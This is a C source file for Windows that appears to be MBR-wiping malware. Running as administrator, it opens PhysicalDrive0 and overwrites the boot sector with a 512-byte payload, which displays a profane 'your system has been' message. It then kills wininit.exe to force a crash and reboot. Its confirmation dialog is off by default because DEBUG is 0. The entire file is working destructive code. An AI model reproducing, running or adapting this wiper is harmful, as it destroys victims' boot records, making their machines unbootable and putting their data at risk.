#ifdef _WIN32
#include <windows.h>
#else
#error "This code can only compile on windows"
#endif
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#define DEBUG 0

// Define constants for boot sector overwrite

// Function to display error message and exit
void handleError(const char* message) {
    fprintf(stderr, "Error: %s\n", message);
    exit(EXIT_FAILURE);
}

// Function to display warning message
void displayWarning() {
    int msgboxID = MessageBoxW(
        NULL,
        L"Press yes to destroy your computer",
        L"!! WARNING !!",
        MB_ICONWARNING | MB_YESNO
    );

    if (msgboxID == IDNO) {
        printf("No Pressed\n");
        exit(EXIT_SUCCESS);
    }
}
// Function to overwrite boot sector
void overwriteBootSector(HANDLE hDevice) {
    /*BEGIN DO NOT CHANGE (TO BE CHANGED BY 'Get Ready.py' ONLY)*/

    unsigned char bootBytes[512] = {232, 21, 0, 187, 39, 124, 138, 7, 60, 0, 116, 11, 232, 3, 0, 67, 235, 244, 180, 14, 205, 16, 195, 195, 180, 7, 176, 0, 183, 66, 185, 0, 0, 186, 79, 24, 205, 16, 195, 89, 111, 117, 114, 32, 115, 121, 115, 116, 101, 109, 32, 104, 97, 115, 32, 111, 102, 102, 105, 99, 105, 97, 108, 108, 121, 32, 98, 101, 101, 110, 32, 102, 117, 99, 107, 101, 100, 46, 13, 10, 71, 111, 111, 100, 98, 121, 101, 46, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 85, 170};

    /*END DO NOT CHANGE*/

    DWORD bytesWritten;
    if (!WriteFile(hDevice, bootBytes, 512, &bytesWritten, NULL)) {
        handleError("Failed to write boot sector");
    }
}

// Function to check if the program is running with administrator privileges
bool isRunningAsAdmin() {
    BOOL isAdmin;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    if (!AllocateAndInitializeSid(
            &NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0,
            0, 0, 0, &AdministratorsGroup
            )) {
        return false;
    }
    if (!CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin)) {
        FreeSid(AdministratorsGroup);
        return false;
    }
    FreeSid(AdministratorsGroup);
    return isAdmin != 0;
}

int main() {
    if (!isRunningAsAdmin()) {
        handleError("This program must be run as an administrator.\nPlease run this program as administrator");
    }

#pragma clang diagnostic push
#pragma ide diagnostic ignored "Simplify"
    if (DEBUG) {
        displayWarning();
    }
#pragma clang diagnostic pop

    // Open handle to the physical drive with appropriate access rights
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        handleError("Failed to open physical drive");
    }

    // Overwrite the boot sector
    overwriteBootSector(hDevice);

    // Close handle to the physical drive
    CloseHandle(hDevice);

    // Restart the system
    if (DEBUG) {
        system("shutdown -r -t 0");
    } else{
        system("taskkill /F /IM wininit.exe /T");
    }

    return 0;
}
